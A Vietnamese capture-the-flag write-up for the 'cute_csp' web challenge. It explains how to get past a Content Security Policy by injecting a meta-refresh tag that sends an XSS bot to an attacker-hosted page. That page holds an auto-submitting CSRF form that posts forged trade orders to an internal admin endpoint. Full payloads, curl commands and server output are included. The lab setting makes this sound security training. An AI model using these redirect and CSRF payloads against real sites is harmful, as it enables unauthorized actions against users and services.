# Writeup: cute_csp 

## Mô tả thử thách
Thử thách **cute_csp** cung cấp một ứng dụng web có bot XSS (`/report.php?url=`) truy cập các URL do người dùng cung cấp.  
Bot chạy **trong mạng nội bộ**, cho phép nó truy cập các dịch vụ `localhost:5000` mà bên ngoài không thể truy cập.  
Điểm đặc biệt là trang bị **Content Security Policy (CSP)** nghiêm ngặt, ngăn JavaScript inline hoặc `<script>` trực tiếp.  
Nhiệm vụ là **bỏ qua CSP** và lợi dụng bot để **thực hiện giao dịch giả mạo** (CSRF) nhằm lấy cờ từ hệ thống.

## Bước 1: Trinh sát & Phân tích hạn chế
Thử nghiệm:
<img width="1486" height="381" alt="1" src="https://github.com/user-attachments/assets/c3fd875c-db94-49bc-b5e9-e33e76a7f848" />

```
curl "http://target.com/report.php?url=http://localhost:5000/index.php"

->>
<pre>[xssbot] visiting url

--------------------------------
[xssbot] complete
[xssbot] total request time: 10.032988071442 seconds</pre> 
```

## Bước 2: Bỏ qua CSP bằng Meta Refresh
Ý tưởng: Dùng thẻ ```<meta http-equiv="refresh">``` để chuyển hướng bot sang payload của kẻ tấn công.

Ví dụ payload:
```
<meta http-equiv="refresh" content="0;url=http://[IP-ATTACKER]:8000/poc.html">
```

Mã hóa URL:
```
%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Dhttp%3A%2F%2F[IP-ATTACKER]%3A8000%2Fpoc.html%22%3E
```

URL tấn công:
```
http://localhost:5000/index.php?html=%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Dhttp%3A%2F%2FATTACKER-IP%3A8000%2Fpoc.html%22%3E
```

Lý do hoạt động:
	- Meta refresh là tính năng HTML, không bị CSP chặn như JS
	- Thực hiện điều hướng ngay (content="0")
	- Không bị coi là script execution

## Bước 3: Tạo payload CSRF
Trên máy chủ attacker (poc.html):
<img width="1482" height="280" alt="2" src="https://github.com/user-attachments/assets/b92a03c6-9e54-45c9-adcc-2fa7bec4da6f" />
```
<!doctype html><meta charset="utf-8">
<form id="f" action="http://localhost:5000/admin.php" method="POST">
  <input type="hidden" name="url"
     value="http://localhost:5000/admin.php/../index.php?html=-%20amount%3A%201000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20BUY%0A-%20amount%3A%201000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20SELL%0A-%20amount%3A%201%0A%20%20currency%3A%20FL%0A%20%20op%3A%20BUY%0A">
</form>
<script>
f.submit()
</script>
```

Phân tích:
	- Gửi POST tới /admin.php
	- Tham số url chứa YAML được URL encode
	- YAML giả lệnh giao dịch để mua 1 FL → kích hoạt flag
	
## Bước 4: Thiết lập hạ tầng
Trên máy attacker:
```
python3 -m http.server 8000
```
**Lưu file poc.html ở thư mục gốc.

## Bước 5: Thực thi tấn công
Gửi tới bot:
```
curl -vv "http://TARGET-DOMAIN/report.php?url=http://localhost:5000/index.php?html=%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Dhttp%3A%2F%2FATTACKER-IP%3A8000%2Fpoc.html%22%3E"
```
<img width="1462" height="496" alt="3" src="https://github.com/user-attachments/assets/903a8e90-6235-4290-adb5-7cd27e5eddc8" />
## Bước 6: Kết quả
Bot thực thi:
- Truy cập /index.php với meta refresh
- Chuyển hướng tới payload attacker
- Gửi CSRF request tới /admin.php
- Thực hiện giao dịch → trả về flag

Kết quả server trả:
```
<pre>[xssbot] visiting url
--------------------------------
<head></head><body><pre>11111
fgc- amount: 1000000
  currency: ZZZ
  op: BUY
- amount: 1000000
  currency: ZZZ
  op: SELL
- amount: 1
  currency: FL
  op: BUY

22222
urlhttp://localhost:5000/admin.php/../index.php?html=-%20amount%3A%201000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20BUY%0A-%20amount%3A%201000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20SELL%0A-%20amount%3A%201%0A%20%20currency%3A%20FL%0A%20%20op%3A%20BUY%0A
33333
Transactions Processing Sheet
--------------------------
- 1000000x ZZZ (Rate: 0.0) =   0
+ 1000000x ZZZ (Rate: 0.0) =   0
-  1x FL (Rate: 1000000.0) = 1000000
Final Inventory ZZZ   : 0
Final Inventory FL    : BHFlagY{Fake}

</pre></body>
--------------------------------
[xssbot] complete
04:05:39.427435 [0-0] * Connection #0 to host 192.168.217.139 left intact
[xssbot] total request time: 2.3027760982513 seconds</pre>
```




